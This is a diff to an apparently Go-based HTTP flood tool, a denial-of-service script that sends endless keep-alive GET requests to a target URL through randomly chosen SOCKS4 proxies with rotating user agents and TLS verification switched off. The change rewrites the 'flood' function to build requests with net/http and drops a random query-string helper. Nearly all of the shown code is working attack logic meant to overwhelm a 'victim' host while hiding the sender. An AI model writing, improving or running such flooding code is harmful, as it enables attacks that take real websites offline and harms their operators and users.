@@ -3,9 +3,8 @@ package main
 import (
 	"bufio"
 	"crypto/tls"
-	"fmt"
 	"math/rand"
-	"net"
+	"net/http"
 	"net/url"
 	"os"
 	"os/exec"
@@ -31,21 +30,6 @@ func random(seeds []string) string {
 	return seeds[rand.Intn(len(seeds))]
 }
 
-func randomString(n int) string {
-	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
-
-	s := make([]rune, n)
-	for i := range s {
-		s[i] = letters[rand.Intn(len(letters))]
-	}
-
-	return string(s)
-}
-
-func randomParam() string {
-	return fmt.Sprintf("?%s=%s", randomString(5), randomString(1000))
-}
-
 func readLines(fileName string) []string {
 	var lines []string
 	openFile, _ := os.Open(fileName)
@@ -57,51 +41,42 @@ func readLines(fileName string) []string {
 	return lines
 }
 
-func flood(host, useragent, proxy string, n int) {
-	var conn net.Conn
-
-	victim, err := url.Parse(host)
+func flood(u *url.URL, useragent, proxy string, n int) {
+	req, err := http.NewRequest("GET", u.String(), nil)
 	if err != nil {
 		return
 	}
 
-	header := []byte("GET / HTTP/1.1\r\n" +
-		"Host: " + victim.Hostname() + "\r\n" +
-		"User-Agent: " + useragent + "\r\n" +
-		"Connection: keep-alive\r\n" +
-		"\r\n")
+	req.Header.Set("Accept", "*/*")
+	req.Header.Set("User-Agent", useragent)
+	req.Header.Set("Connection", "keep-alive")
 
 	dialer, err := proxyclient.NewProxyClient("socks4://" + proxy)
 	if err != nil {
 		return
 	}
 
-	port := "80"
-	if victim.Scheme == "https" {
-		port = "443"
-	}
-
-	conn, err = dialer.DialTimeout("tcp", victim.Hostname()+":"+port, 5*time.Second)
+	conn, err := dialer.DialTimeout("tcp", u.Host, 5*time.Second)
 	if err != nil {
 		return
 	}
 
-	if port == "443" {
+	if u.Scheme == "https" {
 		conn = tls.Client(conn, &tls.Config{
-			ServerName:         host,
+			ServerName:         u.Hostname(),
 			InsecureSkipVerify: true,
 		})
 	}
 
 	defer conn.Close()
 	for i := 0; i < n; i++ {
-		conn.Write(header)
+		req.Write(conn)
 	}
 }
 
-func worker(host string, useragents, proxies []string) {
+func worker(u *url.URL, useragents, proxies []string) {
 	for {
-		flood(host, random(useragents), random(proxies), 100)
+		flood(u, random(useragents), random(proxies), 100)
 	}
 }
 
